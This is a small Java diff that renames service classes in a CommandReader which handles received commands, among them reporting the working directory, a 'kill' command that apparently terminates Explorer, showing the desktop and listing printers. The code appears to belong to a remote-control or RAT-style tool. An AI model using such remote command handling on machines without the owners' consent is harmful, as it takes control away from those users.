@@ -54,10 +54,10 @@ public class CommandReader {
             new ResponseSender("response", "Current Dir | " + System.getProperty("user.dir"));
             new ResponseSender().reset();
         } else if (command.equals("kill")) {
-            new BonziService().killExplorer();
+            new KillService().kill();
             new ResponseSender().reset();
         } else if (command.equals("desktop")) {
-            new BonziService().showDesktop();
+            new DesktopService().showDesktop();
             new ResponseSender().reset();
         } else if (command.equals("printer")) {
             new PrinterService().getPrinters();
